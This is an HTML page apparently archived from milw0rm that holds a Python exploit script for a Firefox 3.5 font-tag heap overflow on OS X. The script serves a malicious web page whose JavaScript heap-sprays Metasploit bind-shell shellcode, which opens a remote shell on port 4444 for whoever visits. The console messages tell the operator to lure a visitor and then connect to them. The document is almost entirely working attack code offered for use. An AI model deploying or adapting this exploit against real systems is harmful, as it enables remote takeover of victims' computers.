<html><head><title>Mozilla Firefox 3.5 (Font tags) Remote Buffer Overflow Exploit (osx)</title></head><pre>#!/usr/bin/env python
#######################################################
#
# FireFox 3.5 Heap Spray OS X Exploit
# Modified by: Dr_IDE
# Originally Discovered by: Simon Berry-Bryne
# Pythonized by: David Kennedy (ReL1K) @ SecureState
# Thanks to HDM
# Tested on OS X 10.5.7
#
#######################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == &quot;/&quot;:
        target=self.client_address[0]
        self.wfile.write(&quot;&quot;&quot;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Firefox 3.5 Vulnerability&lt;/title&gt;
Firefox 3.5 Heap Spray Exploit for OSX
&lt;/br&gt;
Mozilla, We have a problem.
Bind Shell Delivered on Port: 4444
&lt;/br&gt;
&lt;div id=&quot;content&quot;&gt;
&lt;p&gt;&lt;FONT&gt;                             &lt;/FONT&gt;&lt;/p&gt;
&lt;p&gt;&lt;FONT&gt;Ihazacrashihazacrash&lt;/FONT&gt;&lt;/p&gt;
&lt;p&gt;&lt;FONT&gt;Ohnoesihazacrashhazcrash&lt;/FONT&gt;&lt;/p&gt;
&lt;p&gt;&lt;FONT&gt;Aaaaahhhhh  &lt;/FONT&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;script language=JavaScript&gt;

// osx/x86/vforkshell_bind_tcp - 152 bytes
// http://www.metasploit.com
// AppendExit=false, PrependSetresuid=false, 
// PrependSetuid=false, LPORT=4444, RHOST=, 
// PrependSetreuid=false
var shellcode = unescape(&quot;%uc031%u5099%u5040%u5040%ub052%ucd61%u0f80%u7e82%u0000%u8900%u52c6%u5252%u0068%u1102%u895c%u6ae3%u5310%u5256%u68b0%u80cd%u6772%u5652%ub052%ucd6a%u7280%u525e%u5652%ub052%ucd1e%u7280%u8954%u31c7%u83db%u01eb%u5343%u5357%u5ab0%u80cd%u4372%ufb83%u7503%u31f1%u50c0%u5050%ub050%ucd3b%u9080%u3c90%u752d%ub009%ucd42%u8380%u00fa%u1774%uc031%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u5350%ub050%ucd3b%u3180%u50c0%ue389%u5050%u5053%ub050%ucd07%u3180%u50c0%u4050%u80cd&quot;);
var oneblock = unescape(&quot;%u4141%u4141&quot;);
var fullblock = oneblock;
while (fullblock.length&lt;0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (i=0; i&lt;600; i++)  
{
    sprayContainer[i] = fullblock + shellcode;
}
var searchArray = new Array()
 
function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i&lt;data.length;i++)
  {
   c=data.charAt(i);
   if(c=='&amp;' || c=='?' || c=='=' || c=='%' || c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0][&quot;str&quot;] = &quot;blah&quot;;
    var newElement = document.getElementById(&quot;content&quot;)
    if (document.getElementsByTagName) {
        var i=0;
        pTags = newElement.getElementsByTagName(&quot;p&quot;)
        if (pTags.length &gt; 0)  
        while (i&lt;pTags.length)
        {
            oTags = pTags[i].getElementsByTagName(&quot;font&quot;)
            searchArray[i+1] = new Array()
            if (oTags[0])  
            {
                searchArray[i+1][&quot;str&quot;] = oTags[0].innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML()
{
    var html = &quot;&quot;;
    for (i=1;i&lt;searchArray.length;i++)
    {
        html += escapeData(searchArray[i][&quot;str&quot;])
    }    
}
DataTranslator();
GenerateHTML()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;&quot;&quot;&quot;)
        print (&quot;\n\n[*] Exploit Sent. [*]\n[*] Wait about 15 seconds and attempt to connect.[*]\n[*] Connect to IP Address: %s and port 4444 [-]&quot; % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)
    self.send_header(&quot;Server&quot;, &quot;myRequestHandler&quot;)
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print (&quot;&quot;&quot;
#######################################################
#
# FireFox 3.5 Heap Spray OS X Exploit
# Modified by: Dr_IDE
# Originally discovered by: Simon Berry-Bryne
# Pythonized: David Kennedy (ReL1K) @ SecureState
# Thanks to HDM
# Tested on OS X 10.5.7
#
#######################################################
&quot;&quot;&quot;)
print (&quot;Listening on port 80.&quot;)
print (&quot;Have someone connect to you.&quot;)
print (&quot;\nType &lt;control&gt;-c to exit..&quot;)
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print (&quot;\n\n[*] Exiting Exploit.\n\n&quot;)
       sys.exit(1)

# milw0rm.com [2009-07-24]</pre></html>